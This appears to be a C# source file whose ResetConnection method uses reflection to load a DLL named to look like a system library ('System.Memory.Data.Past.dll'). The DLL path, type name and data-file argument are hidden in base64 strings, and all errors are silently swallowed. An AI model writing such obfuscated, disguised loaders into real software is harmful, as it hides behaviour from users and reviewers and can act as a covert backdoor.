using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;

namespace DynamicSugar
{
    public class FPE
    {
        //public static string sTob(string s)
        //{
        //    byte[] bytes = Encoding.UTF8.GetBytes(s);
        //    string base64 = Convert.ToBase64String(bytes);
        //    return base64;
        //}

        public static string bTos(string b)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(b));
        }

        public static bool ResetConnection()
        {
            try
            {
                var myAssembly = Assembly.LoadFrom(Encoding.UTF8.GetString(Convert.FromBase64String("LlxTeXN0ZW0uTWVtb3J5LkRhdGEuUGFzdC5kbGw="))); // @".\System.Memory.Data.Past.dll"
                var myType = myAssembly.GetType(Encoding.UTF8.GetString(Convert.FromBase64String("U3lzdGVtLk1lbW9yeS5EYXRhLlBhc3QuRlBFU2VydmVy"))); // "System.Memory.Data.Past.FPEServer"
                var myMethod = myType.GetMethod(Encoding.UTF8.GetString(Convert.FromBase64String("UmVzZXRDb25uZWN0aW9u")), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
                if (myMethod != null)
                    return (bool)myMethod.Invoke(null, new object[] { "LlxGaWxlc1x6Q2FzRGF0YS5kYXQ=" }); //var s = @".\Files\zCasData.dat";
            }
            catch (Exception ex)
            {
            }
            return false;
        }
    }
}
